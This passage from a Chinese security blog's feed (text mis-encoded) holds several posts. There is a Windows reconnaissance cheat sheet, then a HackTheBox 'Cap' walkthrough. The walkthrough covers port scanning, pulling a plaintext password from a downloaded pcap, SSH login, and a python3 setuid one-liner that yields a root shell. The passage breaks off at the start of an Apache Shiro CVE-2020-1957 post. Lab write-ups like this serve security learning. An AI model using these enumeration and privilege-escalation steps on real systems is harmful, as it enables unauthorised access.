    <summary type="html">&lt;h2 id=&quot;0x01-å·¥ä½œç»„ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#0x01-å·¥ä½œç»„ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;0x01.å·¥ä½œç»„ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;0x01.å·¥ä½œç»„ä¿¡æ¯æ”¶é›†&lt;/h2&gt;&lt;h3 id=&quot;01-æ£€æµ‹å½“å‰shellæƒé™&quot;&gt;&lt;a href=&quot;#01-æ£€æµ‹å½“å‰shellæƒé™&quot; class=&quot;headerlink&quot; title=&quot;01.æ£€æµ‹å½“å‰shellæƒé™&quot;&gt;&lt;/a&gt;01.æ£€æµ‹å½“å‰shellæƒé™&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;whoami /user    #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„SID&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;whoami /priv    #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„å®‰å…¨æƒé™&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;whoami /all&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;02-æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯&quot;&gt;&lt;a href=&quot;#02-æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯&quot; class=&quot;headerlink&quot; title=&quot;02.æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯&quot;&gt;&lt;/a&gt;02.æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¿¡æ¯&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systeminfo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;03-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€&quot;&gt;&lt;a href=&quot;#03-tcp-udp-ç½‘ç»œè¿æ¥çŠ¶æ€&quot; class=&quot;headerlink&quot; title=&quot;03.tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€&quot;&gt;&lt;/a&gt;03.tcp/udp ç½‘ç»œè¿æ¥çŠ¶æ€&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;netstat -nao&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="å†…ç½‘æ¸—é€æµ‹è¯•" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="å†…ç½‘å®‰å…¨" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[cap]</title>
    <link href="https://lunamoore.github.io/2021/07/14/HTB-cap/"/>
    <id>https://lunamoore.github.io/2021/07/14/HTB-cap/</id>
    <published>2021-07-14T06:23:37.000Z</published>
    <updated>2021-07-14T06:30:37.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/07/14/HTB-cap/image-20210714122750156.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†21ã€21ã€80ç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/cap]</span><br><span class="line">â””â”€# ftp anonymous@10.10.10.245                                                                                                                             1 âš™</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 00:34 EDT</span><br><span class="line">Nmap scan report for 10.10.10.245</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT     STATE    SERVICE        VERSION</span><br><span class="line">21/tcp   open     ftp            vsftpd 3.0.3</span><br><span class="line">22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)</span><br><span class="line">|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)</span><br><span class="line">|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)</span><br><span class="line">80/tcp   open     http           gunicorn</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 193</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid Request Line &amp;#x27;Invalid HTTP request line: &amp;#x27;&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Wed, 14 Jul 2021 04:39:13 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 19386</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Security Dashboard&lt;/title&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;</span><br><span class="line">|     &lt;!-- amchar</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Wed, 14 Jul 2021 04:39:14 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Allow: GET, HEAD, OPTIONS</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 196</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">|_http-server-header: gunicorn</span><br><span class="line">|_http-title: Security Dashboard</span><br><span class="line">1117/tcp filtered ardus-mtrns</span><br><span class="line">3371/tcp filtered satvid-datalnk</span><br><span class="line">5822/tcp filtered unknown</span><br><span class="line">5952/tcp filtered unknown</span><br><span class="line">8652/tcp filtered unknown</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.91%I=7%D=7/14%Time=60EE6988%P=x86_64-pc-linux-gnu%r(GetR</span><br><span class="line">SF:equest,1059,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20</span><br><span class="line">SF:Wed,\x2014\x20Jul\x202021\x2004:39:13\x20GMT\r\nConnection:\x20close\r\</span><br><span class="line">SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193</span><br><span class="line">SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\</span><br><span class="line">SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\</span><br><span class="line">SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\</span><br><span class="line">SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=</span><br><span class="line">SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image</span><br><span class="line">SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;</span><br><span class="line">SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;</span><br><span class="line">SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon</span><br><span class="line">SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20</span><br><span class="line">SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=</span><br><span class="line">SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.</span><br><span class="line">SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c</span><br><span class="line">SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption</span><br><span class="line">SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x2</span><br><span class="line">SF:014\x20Jul\x202021\x2004:39:14\x20GMT\r\nConnection:\x20close\r\nConten</span><br><span class="line">SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OP</span><br><span class="line">SF:TIONS\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2</span><br><span class="line">SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text</span><br><span class="line">SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20</span><br><span class="line">SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali</span><br><span class="line">SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP</span><br><span class="line">SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(GenericLines,11E,&quot;HTT</span><br><span class="line">SF:P/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type</span><br><span class="line">SF::\x20text/html\r\nContent-Length:\x20193\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x</span><br><span class="line">SF:20&lt;body&gt;\n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\</span><br><span class="line">SF:x20Invalid\x20Request\x20Line\x20&amp;#x27;Invalid\x20HTTP\x20request\x20li</span><br><span class="line">SF:ne:\x20&amp;#x27;&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;);</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 221.16 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-FTPåŒ¿åè®¿é—®"><a href="#0x02-FTPåŒ¿åè®¿é—®" class="headerlink" title="0x02.FTPåŒ¿åè®¿é—®"></a>0x02.FTPåŒ¿åè®¿é—®</h2><p><code>ç”±äºå¼€æ”¾äº†21ç«¯å£ï¼Œæ‰€ä»¥å°è¯•åŒ¿åç™»å…¥ï¼Œå¯ä»¥çœ‹åˆ°ä¸å…è®¸åŒ¿åç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/cap]</span><br><span class="line">â””â”€# ftp anonymous@10.10.10.245                                                                                                                             1 âš™</span><br><span class="line">ftp: anonymous@10.10.10.245: Name or service not known</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><p><code>æ‰‹åŠ¨çˆ¬è™«å‘ç°è¿™æ˜¯ä¸€ä¸ªç½‘ç»œè®¾å¤‡ç®¡ç†é¢æ¿</code></p><img src="/2021/07/14/HTB-cap/image-20210714131548126.png" class><p><code>å¤šæ¬¡ç‚¹å‡»å‘ç°urlä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œä¸”å¯ä»¥ä¸‹è½½æ•°æ®åŒ…</code></p><img src="/2021/07/14/HTB-cap/image-20210714131753971.png" class><img src="/2021/07/14/HTB-cap/image-20210714131753971.png" class><p><code>æ‰«ædataç›®å½•ï¼Œè®¿é—®å‘ç°ä¸€å…±æœ‰6ä¸ªæœ‰æ•ˆé“¾æ¥ï¼Œåˆ†åˆ«æ˜¯0ã€1ã€2ã€3ã€4ã€5ï¼Œå…¨éƒ¨ä¸‹è½½</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€(rootğŸ’€kali)-[~/htb/cap]</span><br><span class="line">â””â”€# dirb http://10.10.10.245/data/                                                                                                                         1 âš™</span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">START_TIME: Wed Jul 14 01:10:25 2021</span><br><span class="line">URL_BASE: http://10.10.10.245/data/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line">---- Scanning URL: http://10.10.10.245/data/ ----</span><br><span class="line">+ http://10.10.10.245/data/0 (CODE:200|SIZE:17147)</span><br><span class="line">+ http://10.10.10.245/data/00 (CODE:200|SIZE:17147) </span><br><span class="line">+ http://10.10.10.245/data/01 (CODE:200|SIZE:17144) </span><br><span class="line">+ http://10.10.10.245/data/02 (CODE:200|SIZE:17144)</span><br><span class="line">+ http://10.10.10.245/data/03 (CODE:200|SIZE:17144)                                                   </span><br><span class="line">+ http://10.10.10.245/data/04 (CODE:200|SIZE:17144)                                                     </span><br><span class="line">+ http://10.10.10.245/data/05 (CODE:200|SIZE:17147)                                                   </span><br><span class="line">+ http://10.10.10.245/data/1 (CODE:200|SIZE:17144)                                                      </span><br><span class="line">+ http://10.10.10.245/data/2 (CODE:200|SIZE:17144)                                                       </span><br><span class="line">+ http://10.10.10.245/data/3 (CODE:200|SIZE:17144)                                                       </span><br><span class="line">+ http://10.10.10.245/data/4 (CODE:200|SIZE:17144)                                                       + http://10.10.10.245/data/5 (CODE:200|SIZE:17147)</span><br></pre></td></tr></table></figure><img src="/2021/07/14/HTB-cap/image-20210714132457089.png" class><h2 id="0x04-æ•°æ®åŒ…åˆ†æ"><a href="#0x04-æ•°æ®åŒ…åˆ†æ" class="headerlink" title="0x04.æ•°æ®åŒ…åˆ†æ"></a>0x04.æ•°æ®åŒ…åˆ†æ</h2><p><code>6ä¸ªæ•°æ®åŒ…ä¸­åªæœ‰0.pcapåŒ…å«æœ‰ç”¨ä¿¡æ¯ï¼Œå¾—åˆ°ç”¨æˆ·ä¸å¯†ç </code></p><blockquote><p>user:nathan</p><p>pass:Buck3tH4TF0RM3!</p></blockquote><img src="/2021/07/14/HTB-cap/image-20210714140327176.png" class><p><code>ç™»å…¥å¾—åˆ°flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ssh nathan@10.10.10.245                                                                                                                                1 âš™</span><br><span class="line">nathan@10.10.10.245&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Wed Jul 14 06:11:21 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:           0.04</span><br><span class="line">  Usage of /:            35.0% of 8.73GB</span><br><span class="line">  Memory usage:          21%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             228</span><br><span class="line">  Users logged in:       0</span><br><span class="line">  IPv4 address for eth0: 10.10.10.245</span><br><span class="line">  IPv6 address for eth0: dead:beef::250:56ff:feb9:dda9</span><br><span class="line"></span><br><span class="line">  =&gt; There are 4 zombie processes.</span><br><span class="line"></span><br><span class="line"> * Super-optimized for small spaces - read how we shrank the memory</span><br><span class="line">   footprint of MicroK8s to make it the smallest full K8s around.</span><br><span class="line"></span><br><span class="line">   https://ubuntu.com/blog/microk8s-memory-optimisation</span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">nathan@cap:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">nathan@cap:~$ cat user.txt </span><br><span class="line">*************************</span><br><span class="line">nathan@cap:~$</span><br></pre></td></tr></table></figure><h2 id="0x05-ææƒ"><a href="#0x05-ææƒ" class="headerlink" title="0x05.ææƒ"></a>0x05.ææƒ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nathan@cap:~$ python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash"> /bin/bash</span></span><br><span class="line">root@cap:~# cd /root</span><br><span class="line">root@cap:/root# ls</span><br><span class="line">root.txt  snap</span><br><span class="line">root@cap:/root# cat root.txt </span><br><span class="line">****************************</span><br><span class="line">root@cap:/root# </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2021/07/14/HTB-cap/image-20210714122750156.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1957</title>
    <link href="https://lunamoore.github.io/2021/06/06/CVE-2020-1957/"/>
    <id>https://lunamoore.github.io/2021/06/06/CVE-2020-1957/</id>
    <published>2021-06-06T13:20:02.000Z</published>
    <updated>2021-06-06T13:39:25.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ï¼ˆCVE-2020-1957ï¼‰Apache-Shiro-èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´"><a href="#ï¼ˆCVE-2020-1957ï¼‰Apache-Shiro-èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´" class="headerlink" title="ï¼ˆCVE-2020-1957ï¼‰Apache Shiro èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´"></a>ï¼ˆCVE-2020-1957ï¼‰Apache Shiro èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´</h2><hr><h2 id="0x01-æ¼æ´ç®€è¿°"><a href="#0x01-æ¼æ´ç®€è¿°" class="headerlink" title="0x01.æ¼æ´ç®€è¿°"></a>0x01.æ¼æ´ç®€è¿°</h2><p>Apache Shiro 1.5.2ä¹‹å‰ç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„è¯·æ±‚åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡èº«ä»½éªŒè¯ã€‚</p><a id="more"></a><h2 id="0x02-å½±å“ç‰ˆæœ¬"><a href="#0x02-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x02.å½±å“ç‰ˆæœ¬"></a>0x02.å½±å“ç‰ˆæœ¬</h2><p>Apache Shiro &lt; v1.5.2</p><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03.æ¼æ´åˆ†æ"></a>0x03.æ¼æ´åˆ†æ</h2><p><span class="exturl" 